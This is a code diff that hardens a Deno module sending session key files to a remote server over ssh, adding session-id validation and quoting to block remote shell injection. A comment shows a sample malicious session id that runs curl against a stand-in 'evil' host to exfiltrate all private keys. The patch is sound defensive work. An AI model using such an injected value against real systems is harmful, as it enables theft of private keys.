@@ -19,6 +19,30 @@ export interface SessionKeypair {
 
 export type IdentityTransport = (sessionId: string, identity: string) => Promise<void>;
 
+/**
+ * Session ids are interpolated into a command that a REMOTE SHELL executes, so
+ * they are validated against an allowlist before they can get near one.
+ *
+ * The subtlety worth spelling out: `new Deno.Command('ssh', { args: [...] })`
+ * spawns no local shell, which makes the array form look safe. It is -- locally.
+ * But ssh's trailing argument is the remote command, and sshd concatenates its
+ * arguments into one string and feeds it to the login shell. A session id of
+ *     x; curl http://evil/$(cat /var/lib/romania/keys/*.key); #
+ * would therefore run on the one machine holding every respondent's private
+ * key. The local argv boundary says nothing about what happens after the string
+ * crosses the network.
+ *
+ * The charset deliberately matches romania/keystore.ts's SESSION_ID exactly.
+ * Iceland must not accept an id that Romania will later reject, or pushes
+ * succeed and renders mysteriously fail; and it must not accept one Romania
+ * would take blindly. Both ends move together.
+ */
+const SESSION_ID = /^[0-9a-fA-F-]{8,64}$/;
+
+export function assertSafeSessionId(sessionId: string): void {
+  if (!SESSION_ID.test(sessionId)) throw new Error('invalid session id');
+}
+
 const ROMANIA_SSH = Deno.env.get('ROMANIA_SSH_DEST') || '';
 const ROMANIA_KEY_DIR = Deno.env.get('ROMANIA_KEY_DIR') || '';
 const ROMANIA_SSH_KEY = Deno.env.get('ROMANIA_SSH_KEY') || '';
@@ -45,6 +69,9 @@ export function breakglassRecipient(): string {
  * exercise -- an unpinned host key would let anything on the mesh collect keys.
  */
 const scpTransport: IdentityTransport = async (sessionId, identity) => {
+  // Re-checked here, not only at the entry point: this is the function that
+  // builds a remote shell command, so it does not delegate its own safety.
+  assertSafeSessionId(sessionId);
   if (!ROMANIA_SSH || !ROMANIA_KEY_DIR) {
     throw new Error('Romania transport not configured');
   }
@@ -59,7 +86,11 @@ const scpTransport: IdentityTransport = async (sessionId, identity) => {
       '-o',
       'ConnectTimeout=10',
       ROMANIA_SSH,
-      `umask 077 && cat > ${ROMANIA_KEY_DIR}/${sessionId}.key`,
+      // Single-quoted as belt-and-braces. The allowlist above already excludes
+      // every metacharacter including the quote itself, so this cannot be
+      // broken out of -- but the quoting means a future widening of the
+      // charset degrades to "wrong filename" rather than "remote execution".
+      `umask 077 && cat > '${ROMANIA_KEY_DIR}/${sessionId}.key'`,
     ],
     stdin: 'piped',
     stdout: 'null',
@@ -81,6 +112,10 @@ export async function pushIdentity(
   identity: string,
   transport: IdentityTransport = scpTransport,
 ): Promise<void> {
+  // Validated before ANY transport runs, including injected ones. A custom
+  // transport is not automatically safer than the default, and this is the
+  // single choke point every caller passes through.
+  assertSafeSessionId(sessionId);
   try {
     await transport(sessionId, identity);
   } catch {
